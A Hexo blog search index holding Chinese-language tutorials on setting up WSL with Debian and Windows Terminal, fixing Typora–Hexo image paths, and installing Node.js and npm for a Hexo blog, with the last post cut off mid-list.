<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>wsl的安装与配置</title>
    <url>/archives/cee22f12.html</url>
    <content><![CDATA[<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
<p>之前上过一个Linux的选修课，了解了Linux系统的一些知识，越用越觉得一些需要命令行的软件用Linux来简直太方便了，这篇文章就介绍以下如何在windows系统上搭建Linux子系统（也就是wsl）（Windows Subsystem for Linux），这样就不用使用VMware来装虚拟机了</p>
<span id="more"></span>
<h2 id="windows-10-开启wsl功能"><a class="markdownIt-Anchor" href="#windows-10-开启wsl功能"></a> windows 10 开启wsl功能</h2>
<ol>
<li>按Windows+Q进入搜索功能，也可以右键点击开始，选择里面的搜索功能</li>
<li>在Windows 10的搜索框中输入<code>启用或关闭Windows功能</code></li>
<li>打开后选中<code>适用于Linux的Windows子系统</code><br />
<img src="/images/wsl%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20210503170452634.png" alt="image-20210503170452634" /></li>
</ol>
<h2 id="linux的安装"><a class="markdownIt-Anchor" href="#linux的安装"></a> Linux的安装</h2>
<ol>
<li>打开微软商店（Microsoft Store）</li>
<li>搜索Linux</li>
<li>选择其中的一个发行版本进行安装，本文以debian为例</li>
</ol>
<p><img src="/images/wsl%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20210503171000458.png" alt="image-20210503171000458" /></p>
<p><img src="/images/wsl%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20210503171035452.png" alt="image-20210503171035452" /></p>
<h2 id="linux初始化"><a class="markdownIt-Anchor" href="#linux初始化"></a> Linux初始化</h2>
<ol>
<li>
<p>打开刚下好的Linux，等一小会它的安装</p>
</li>
<li>
<p>输入新创建的用户名</p>
</li>
<li>
<p>输入该用户的密码，输入两次后就进入了Linux系统，新用户也创建完成</p>
</li>
<li>
<p>输入<code>sudo passwd</code>更改root的密码</p>
</li>
<li>
<p>一些知识</p>
<blockquote>
<p>输入<code>su</code>再输入密码进入root模式<br />
输入<code>exit</code>或者按<code>ctrl+d</code>退出root模式<br />
输入<code>sudo 命令</code>可以在普通用户下执行root权限的命令，密码是普通用户的密码</p>
</blockquote>
</li>
</ol>
<h2 id="terminal安装"><a class="markdownIt-Anchor" href="#terminal安装"></a> Terminal安装</h2>
<p>Terminal是一款高颜值的管理命令行软件，如果你习惯于PowerShell或者cmd的话可以跳过此步骤</p>
<ol>
<li>打开微软商店（MicroSoft Store）</li>
<li>搜索Terminal</li>
<li>点击安装</li>
</ol>
<h2 id="terminal配置"><a class="markdownIt-Anchor" href="#terminal配置"></a> Terminal配置</h2>
<p>简单配置一下Terminal，让你用起来更舒服，可跳过</p>
<ol>
<li>打开Terminal</li>
<li>打开设置</li>
</ol>
<p><img src="/images/wsl%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20210503171852186.png" alt="image-20210503171852186" /></p>
<ol start="3">
<li>点击左下角的设置图标，进入Terminal的配置文件，如下，<strong>为了安全起见建议备份一下，不然出问题不好还原</strong></li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// This file was initially generated by Windows Terminal 1.4.3243.0</span></span><br><span class="line"><span class="comment">// It should still be usable in newer versions, but newer versions might have additional</span></span><br><span class="line"><span class="comment">// settings, help text, or changes that you will not see unless you clear this file</span></span><br><span class="line"><span class="comment">// and let us generate a new one for you.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// To view the default settings, hold &quot;alt&quot; while clicking on the &quot;Settings&quot; button.</span></span><br><span class="line"><span class="comment">// For documentation on these settings, see: https://aka.ms/terminal-documentation</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;$schema&quot;</span>: <span class="string">&quot;https://aka.ms/terminal-profiles-schema&quot;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;defaultProfile&quot;</span>: <span class="string">&quot;&#123;58ad8b0c-3ef8-5f4d-bc6f-13e4c00f2530&#125;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;initialRows&quot;</span>: <span class="number">25</span>,</span><br><span class="line">  <span class="attr">&quot;initialCols&quot;</span>: <span class="number">90</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// You can add more global application settings here.</span></span><br><span class="line">  <span class="comment">// To learn more about global settings, visit https://aka.ms/terminal-global-settings</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// If enabled, selections are automatically copied to your clipboard.</span></span><br><span class="line">  <span class="attr">&quot;copyOnSelect&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If enabled, formatted data is also copied to your clipboard</span></span><br><span class="line">  <span class="attr">&quot;copyFormatting&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// A profile specifies a command to execute paired with information about how it should look and feel.</span></span><br><span class="line">  <span class="comment">// Each one of them will appear in the &#x27;New Tab&#x27; dropdown,</span></span><br><span class="line">  <span class="comment">//   and can be invoked from the commandline with `wt.exe -p xxx`</span></span><br><span class="line">  <span class="comment">// To learn more about profiles, visit https://aka.ms/terminal-profile-settings</span></span><br><span class="line">  <span class="attr">&quot;profiles&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;defaults&quot;</span>: &#123;</span><br><span class="line">      <span class="comment">// Put settings here that you want to apply to all profiles.</span></span><br><span class="line">      <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;acrylicOpacity&quot;</span>: <span class="number">0.75</span>,</span><br><span class="line">      <span class="attr">&quot;useAcrylic&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;colorScheme&quot;</span>: <span class="string">&quot;Campbell&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;fontFace&quot;</span>: <span class="string">&quot;Consolas&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;fontSize&quot;</span>: <span class="number">11</span>,</span><br><span class="line">      <span class="attr">&quot;cursorColor&quot;</span>: <span class="string">&quot;#00FF00&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;cursorHeight&quot;</span>: <span class="number">25</span>,</span><br><span class="line">      <span class="attr">&quot;cursorShape&quot;</span>: <span class="string">&quot;vintage&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;snapOnInput&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;padding&quot;</span>: <span class="string">&quot;0, 0, 0, 0&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;closeOnExit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;list&quot;</span>: [</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;58ad8b0c-3ef8-5f4d-bc6f-13e4c00f2530&#125;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Debian&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;Windows.Terminal.Wsl&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;startingDirectory&quot;</span>: <span class="string">&quot;//wsl$/Debian/home/tom/&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// Make changes here to the cmd.exe profile.</span></span><br><span class="line">        <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Command Prompt&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;commandline&quot;</span>: <span class="string">&quot;cmd.exe&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hidden&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hidden&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Azure Cloud Shell&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;Windows.Terminal.Azure&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// Make changes here to the powershell.exe profile.</span></span><br><span class="line">        <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Windows PowerShell&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;commandline&quot;</span>: <span class="string">&quot;powershell.exe&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add custom color schemes to this array.</span></span><br><span class="line">  <span class="comment">// To learn more about color schemes, visit https://aka.ms/terminal-color-schemes</span></span><br><span class="line">  <span class="attr">&quot;schemes&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Campbell&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#A7B191&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#0C0C0C&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;colors&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;#0C0C0C&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#C50F1F&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#13A10E&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#C19C00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#0037DA&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#881798&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#3A96DD&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#CCCCCC&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#767676&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#E74856&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#16C60C&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#F9F1A5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#3B78FF&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#B4009E&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#61D6D6&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#F2F2F2&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Solarized Dark&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#FDF6E3&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#073642&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;colors&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;#073642&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#D30102&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#859900&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#B58900&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#268BD2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#D33682&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#2AA198&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#EEE8D5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#002B36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#CB4B16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#586E75&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#657B83&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#839496&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#6C71C4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#93A1A1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#FDF6E3&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Solarized Light&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#073642&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#FDF6E3&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;colors&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;#073642&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#D30102&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#859900&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#B58900&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#268BD2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#D33682&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#2AA198&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#EEE8D5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#002B36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#CB4B16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#586E75&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#657B83&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#839496&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#6C71C4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#93A1A1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#FDF6E3&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add custom actions and keybindings to this array.</span></span><br><span class="line">  <span class="comment">// To unbind a key combination from your defaults.json, set the command to &quot;unbound&quot;.</span></span><br><span class="line">  <span class="comment">// To learn more about actions and keybindings, visit https://aka.ms/terminal-keybindings</span></span><br><span class="line">  <span class="attr">&quot;actions&quot;</span>: [</span><br><span class="line">    <span class="comment">// Copy and paste are bound to Ctrl+Shift+C and Ctrl+Shift+V in your defaults.json.</span></span><br><span class="line">    <span class="comment">// These two lines additionally bind them to Ctrl+C and Ctrl+V.</span></span><br><span class="line">    <span class="comment">// To learn more about selection, visit https://aka.ms/terminal-selection</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;copy&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;singleLine&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;ctrl+c&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;paste&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;ctrl+v&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Press Ctrl+Shift+F to open the search box</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;find&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;ctrl+shift+f&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Press Alt+Shift+D to open a new pane.</span></span><br><span class="line">    <span class="comment">// - &quot;split&quot;: &quot;auto&quot; makes this pane open in the direction that provides the most surface area.</span></span><br><span class="line">    <span class="comment">// - &quot;splitMode&quot;: &quot;duplicate&quot; makes the new pane use the focused pane&#x27;s profile.</span></span><br><span class="line">    <span class="comment">// To learn more about panes, visit https://aka.ms/terminal-panes</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;splitPane&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;split&quot;</span>: <span class="string">&quot;auto&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;splitMode&quot;</span>: <span class="string">&quot;duplicate&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;alt+shift+d&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>更改配置的几个地方（不要直接复制粘贴，一些值不同）
<ul>
<li>更改<code>defaultProfile</code>，后面的值就粘贴<code>list</code>里面的几个项的<code>guid</code>，这是默认启动打开哪个命令行，我设置的是Debian的</li>
<li><code>initialRows</code>和<code>initialCols</code>设置打开后初始宽高</li>
<li><code>profiles</code>中的<code>defaults</code>是全局设置，可以对照更改。<code>list</code>里面就是Terminal管理的几个命令行软件，有刚装的debian，cmd，Powershell等</li>
<li>我在<code>list</code>里<code>Debian</code>的设置中加了<code>&quot;startingDirectory&quot;:&quot;//wsl$/Debian/home/tom/&quot;</code>，这是默认打开Debian后的目录，tom是我的用户名，大家可以改成自己的</li>
<li><code>schemes</code>中的配置是主题的一些配置，大家可以直接复制粘贴过去添加上</li>
<li><code>actions</code>中是快捷键的配置，大家自行参考</li>
</ul>
</li>
</ol>
<p>恭喜，至此Terminal配置完毕，我用的也是老师给的配置，觉得挺简约还挺好看的，一些其他更花里胡哨的配置请自行网上冲浪</p>
<h2 id="配置wsl"><a class="markdownIt-Anchor" href="#配置wsl"></a> 配置wsl</h2>
<p>言归正传，接下来我们可以使用terminal打开debian，可以在那个加号后面的向下的小箭头里面选择打开的命令行</p>
<h3 id="换源"><a class="markdownIt-Anchor" href="#换源"></a> 换源</h3>
<p>因为debian使用apt作为包管理器，而apt的默认服务器在国外，网速很慢，我们可以换到国内的镜像源来</p>
<ol>
<li>
<p>使用<code>su</code>切换到root权限</p>
</li>
<li>
<p>输入<code>cd /etc/apt</code>切换到对应目录</p>
</li>
<li>
<p>输入<code>cp /etc/apt/sources.list /etc/apt/sources.list_backup</code>备份一下源文件，出错的话便于还原</p>
</li>
<li>
<p>输入<code>nano sources.list</code>利用nano打开<code>sources.list</code>文件</p>
<blockquote>
<p>如果你会使用其他文本编辑器也是一样的<br />
实在不会用的话也可以用记事本，wsl的根目录在windows的<code>C:\Users\Admin\AppData\Local\Packages\TheDebianProject.DebianGNULinux_76v4gfsz19hv4\LocalState\rootfs</code>下，其中用户名和装的Linux有出入，大家对照自己的就行<br />
用记事本打开并做下面更改，保存即可</p>
</blockquote>
</li>
<li>
<p>删除所有内容，将以下内容复制粘贴进去**(命令行中复制和粘贴都是右键)**</p>
<p>debian源：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># 中科大源</span><br><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span><br><span class="line"><span class="meta"># deb-src http:<span class="comment">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span></span><br><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span><br><span class="line"><span class="meta"># deb-src http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># deb http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br><span class="line"><span class="meta"># deb-src http:<span class="comment">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br></pre></td></tr></table></figure>
<p>Ubuntu源：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#  阿里源</span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>ctrl+x</code>退出，输入<code>y</code>再点<code>enter</code>确定修改</p>
</li>
<li>
<p>换源完成</p>
</li>
</ol>
<h2 id="更新包"><a class="markdownIt-Anchor" href="#更新包"></a> 更新包</h2>
<ol>
<li><code>sudo apt update</code>会将新的包下载下来</li>
<li><code>sudo apt upgrade</code>会升级为最新的包，两条命令顺序不要反了</li>
<li>以后安装软件就可以<code>sudo apt install 软件名</code>了，嘻嘻，快捷方便</li>
</ol>
<h2 id="完成"><a class="markdownIt-Anchor" href="#完成"></a> 完成</h2>
<p>恭喜你，你的wsl已经搞定啦，享受Linux带来的快乐吧！</p>
]]></content>
      <categories>
        <category>wsl</category>
      </categories>
      <tags>
        <tag>自学</tag>
        <tag>Linux</tag>
        <tag>wsl</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo与typora的图片路径问题</title>
    <url>/archives/d1451cce.html</url>
    <content><![CDATA[<h2 id="问题描述"><a class="markdownIt-Anchor" href="#问题描述"></a> 问题描述</h2>
<p>不知道新搭建博客的你是否遇到这个问题，用typora写文章时难免要添加一些图片，而正好typora会默认在当前目录<code>hexo/source/_post</code>里创建一个后缀名为<code>.asset</code>的文件夹来存放图片，乍一看，挺好，typora里正常显示，而一推到hexo博客图片就因为路径原因看不了了</p>
<span id="more"></span>
<h2 id="问题分析"><a class="markdownIt-Anchor" href="#问题分析"></a> 问题分析</h2>
<p>路径原因，在typora里默认当前文件存储位置<code>hexo/source/_post</code>为起始目录，而hexo默认source文件夹<code>hexo/source</code>为起始目录，这也就导致了在typora里无论你写相对路径还是绝对路径推到hexo时都是找不到的</p>
<h2 id="解决方法"><a class="markdownIt-Anchor" href="#解决方法"></a> 解决方法</h2>
<p>查了很多方法，网上也有人总结了几大解决方案，觉得不怎么好用，综合之下我决定这样更改</p>
<ol>
<li>
<p>为每篇文章设定其根目录</p>
<blockquote>
<p>typora里是可以自己设定根目录的，在每篇文章的开头中加入</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">typora-root-url:</span> <span class="string">../</span></span><br></pre></td></tr></table></figure>
<p>这样typora里的起始目录就和hexo里一致了</p>
</blockquote>
</li>
<li>
<p>已经写好的文章只能手动添加了，即将写的文章每次都手动加难免累，我们可以更改hexo里的模板<code>hexo/scaffolds/post.md</code>，这是你使用<code>hexo n 文章名</code>命令时生成的模板</p>
<blockquote>
<p>post.md的开头内容</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">title:</span> &#123;&#123; <span class="string">title</span> &#125;&#125;</span><br><span class="line"><span class="attr">typora-root-url:</span> <span class="string">../</span></span><br><span class="line"><span class="attr">date:</span> &#123;&#123; <span class="string">date</span> &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>这样新生成的文章都会以<code>hexo/source</code>为根目录</p>
</blockquote>
</li>
<li>
<p>更改typora的设置</p>
<blockquote>
<p>打开typora的<code>偏好设置</code>，选中<code>图像</code>，更改其设置</p>
<ol>
<li>
<p>选择<code>复制到指定路径</code></p>
</li>
<li>
<p>路径里填你博客的绝对路径，例如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">F:\Blog\source\images\$&#123;filename&#125;</span><br></pre></td></tr></table></figure>
<p>注意后面加${filename}就会以你文章名在images下新建一个图片文件夹，看起来井井有条一些</p>
</li>
<li>
<p>下面的设置一定要勾选<code>优先使用相对路径</code>，这样会防止你贴个图片结果贴成了绝对路径导致hexo不认识</p>
</li>
<li>
<p>参考配置如下图</p>
<p><img src="/images/hexo%E4%B8%8Etypora%E7%9A%84%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/image-20210512152029191.png" alt="image-20210512152029191" /></p>
</li>
</ol>
</blockquote>
</li>
<li>
<p>搞定，看看效果</p>
<p><img src="/images/hexo%E4%B8%8Etypora%E7%9A%84%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/image-20210512152225354.png" alt="image-20210512152225354" /></p>
</li>
</ol>
<h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2>
<p>解决的思想就是让hexo与typora都能认识写的这个路径，也就是说写成<code>/images/文件夹名/图片名</code>这种形式（没办法，hexo默认的就是以<code>hexo/source</code>为根的），所以要对typora进行一些相对复杂的配置让typora也能认识这个路径，于是，我们更改了typora文章的url根目录，并优先使用相对路径。ok，搞定！</p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>自学</tag>
        <tag>博客</tag>
        <tag>博客搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo+github搭建静态博客</title>
    <url>/archives/15b1edd7.html</url>
    <content><![CDATA[<p><strong>写在前面：本来是用windows搭建的博客，但奈何Linux太香了，加上之前<a href="https://wsw8.online/archives/cee22f12.html">装过wsl</a>，所以打算用Linux再搭建一下。另外由于我是搭建好后再写的这篇博客，难免有些记忆错误出现纰漏，望指正。</strong></p>
<p><strong>另：这篇博客持续更新中，现在可能写的还不是很详细，请同时参考参考文献中B站up主code sheep的视频为佳。</strong></p>
<span id="more"></span>
<h2 id="下载nodejs和npm"><a class="markdownIt-Anchor" href="#下载nodejs和npm"></a> 下载nodejs和npm</h2>
<blockquote>
<p>Windows下：</p>
</blockquote>
<p>直接在<a href="https://nodejs.org/zh-cn/">nodejs官网</a>进行下载并安装<br />
<code>node -v</code>命令查看node的版本<br />
<code>npm -v</code>命令查看npm的版本</p>
<blockquote>
<p>Linux 下：</p>
</blockquote>
<p>可以直接使用命令安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install nodejs</span><br></pre></td></tr></table></figure>
<h3 id="可能出现的问题"><a class="markdownIt-Anchor" href="#可能出现的问题"></a> 可能出现的问题</h3>
<p>可能会出现nodejs和npm版本不匹配的问题，这可能是由于Linux上版本太老的缘故，如果出现就要自己手动去官网下载包然后解压在Linux下了</p>
<p>关于nodejs和npm版本适配可参考这个<a href="https://nodejs.org/zh-cn/download/releases/">官网说明</a></p>
<h3 id="问题解决"><a class="markdownIt-Anchor" href="#问题解决"></a> 问题解决</h3>
<ol>
<li>
<p>下载对应的包：<a href="https://nodejs.org/zh-cn/download/">nodejs各种版本官网</a></p>
</li>
<li>
<p>下载好后挪到Linux下，wsl在windows下的目录可以参考<code>C:\Users\Admin\AppData\Local\Packages\TheDebianProject.DebianGNULinux_76v4gfsz19hv4\LocalState\rootfs</code></p>
</li>
<li>
<p>把包放到<code>/opt</code>下，这个文件夹就是用来放用户自己安装的软件的</p>
</li>
<li>
<p>解压使用命令<code>tar -xf 包名</code></p>
</li>
<li>
<p>解压成功后应该可以在<code>/opt/包名/bin/</code>目录下看到<code>node</code>和<code>npm</code>，你进入这个目录，使用<code>./node -v</code>和<code>./npm -v</code>就能查看相应版本，但是这样你每次使用必须给路径很麻烦，所以你可以建立一个软链接</p>
</li>
<li>
<p>给可执行文件建立软链接：</p>
<ol>
<li>输入<code>echo $PATH</code>可以查看你的Linux系统的查找可执行文件的路径，<strong>注意大写</strong></li>
<li>进入<code>/usr/local/bin</code>目录</li>
<li>使用<code>ln -s [源文件或目录] [目标文件或目录]</code>就可以建立软链接，例如这里的建立node的<code>ln -s /opt/node-v14.16.1-linux-x64/bin/node ./node</code>和npm的<code>ln -s /opt/node-v14.16.1-linux-x64/bin/npm ./npm</code></li>
<li>现在你就可以在任何一个目录下使用<code>npm -v</code>和<code>node -v</code>查看版本以及其它命令了</li>
</ol>
</li>
</ol>
<h2 id="npm加速"><a class="markdownIt-Anchor" href="#npm加速"></a> npm加速</h2>
<p>为了加快npm的速度有两种方法：</p>
<ol>
<li>
<p>然后利用npm安装淘宝的cnpm<br />
<code>npm install -g cnpm --registry=http://registry.npm.taobao.org</code>命令安装淘宝的cnpm包管理器<br />
<code>cnpm -v</code>命令查看cnpm的版本</p>
</li>
<li>
<p>npm换源</p>
<p><code>npm config get registry</code>可以查看源地址</p>
<p><code>npm config set [url]</code>可以更换源地址</p>
<p>其中url可选：</p>
